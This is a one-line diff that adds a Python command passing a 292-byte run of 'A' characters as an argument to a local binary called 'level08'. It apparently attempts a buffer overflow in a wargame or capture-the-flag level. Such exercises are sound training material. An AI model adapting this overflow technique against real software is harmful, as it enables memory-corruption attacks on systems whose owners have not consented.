@@ -1,0 +1,1 @@
+python3 -c "import os; p=b'A'*292; os.execve('./level08',[b'./level08',p],os.environ)"
